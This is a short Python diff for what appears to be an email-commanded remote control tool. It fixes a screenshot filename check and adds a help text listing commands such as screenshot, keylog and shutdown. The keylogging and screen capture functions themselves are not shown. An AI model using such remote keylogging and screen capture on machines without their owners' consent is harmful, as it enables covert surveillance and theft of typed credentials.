@@ -26,7 +26,7 @@ def current_time() -> str:
 
 def capture_SS(file_name: str = "Picture.png") -> str:
     ext = [".png", ".jpg", ".jpeg", ".tiff", ".bmp", ".gif"]
-    if any(file_name.endswith(x) for x in ext):
+    if not any(file_name.endswith(x) for x in ext):
         file_name += ".png"
     
     path = "Screenshots\\"
@@ -62,7 +62,7 @@ def logger(duration: int) -> str:
     return file_path
 
 
-def note2log(sender: str, cmd_list: list):
+def note2log(sender: str, cmd_list: list) -> str:
     file_path: str = "Log\\mail.log"
 
     with open(file_path, "a") as log:
@@ -77,3 +77,21 @@ def note2log(sender: str, cmd_list: list):
     )
 
     logging.info(f"From: {sender}, Command: {cmd_list}")
+    
+    return file_path
+
+def list_command() -> str:
+    content = "The supported commands:"
+    content += "\n\t- screenshot [file_name]"
+    content += "\n\t- webcam                        (not available)"
+    content += "\n\t- keylog [time in seconds]"
+    content += "\n\t- logout"
+    content += "\n\t- shutdown [time in seconds]"
+    content += "\n\t- list apps                     (not available)"
+    content += "\n\t- list processes                (not available)"
+    content += "\n\t- kill process                  (not available)"
+    content += "\n\t- show dir                      (not available)"
+    content += "\n\t- show log"
+    content += "\n\t- help"
+    return content
+    
